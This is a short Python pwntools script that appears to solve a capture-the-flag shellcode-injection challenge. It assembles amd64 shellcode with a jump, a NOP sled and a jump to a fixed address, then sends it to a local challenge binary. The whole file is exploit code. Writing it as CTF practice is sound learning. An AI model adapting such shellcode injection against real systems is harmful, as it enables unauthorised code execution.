import glob

from pwn import *

bin_path = glob.glob('/challenge/em*')[0]

context.arch = 'amd64'
shellcode = asm('jmp $+0x53')
shellcode += asm('nop') * 0x51
shellcode += asm('pop rdi')

p = process([bin_path])

print(p.recvuntil(b'Loading your given gode at: ').decode())

vma = p.recvline().strip().decode()
shellcode += asm('jmp 0x403000', vma=int(vma, base=16) + len(shellcode))

p.send(shellcode)
print(p.clean().decode())
